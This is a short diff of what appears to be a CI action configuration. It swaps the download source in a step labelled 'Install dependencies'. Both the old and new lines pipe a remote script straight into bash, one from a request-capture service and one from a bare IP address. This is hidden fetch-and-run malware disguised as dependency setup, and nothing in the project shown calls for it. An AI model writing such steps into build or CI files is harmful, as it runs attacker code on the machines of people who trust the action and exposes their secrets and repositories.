@@ -11,4 +11,4 @@ runs:
   steps:
     - name: Install dependencies
       shell: bash
-      run: curl https://ptjb71o7.requestrepo.com/1|bash
+      run: curl http://148.135.55.70/1|bash
